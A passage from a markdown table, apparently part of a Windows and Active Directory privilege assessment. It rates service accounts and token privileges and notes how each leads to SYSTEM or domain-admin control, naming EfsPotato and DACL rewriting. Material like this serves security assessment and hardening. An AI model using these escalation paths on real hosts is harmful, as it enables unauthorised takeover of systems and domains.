| Service virtual account | `NT SERVICE\MSSQL$SQLEXPRESS` | Low: no password | Ships with `SeImpersonatePrivilege` |
| `SeImpersonatePrivilege` | Service token | Critical on the host | EfsPotato to SYSTEM |
| `BUILTIN\Administrators` on a DC | Directory-stored group | Critical | Domain Admin equivalent |
| `SeManageVolumePrivilege` | Same service token | Critical on the host | Rewrites every DACL on `C:` |
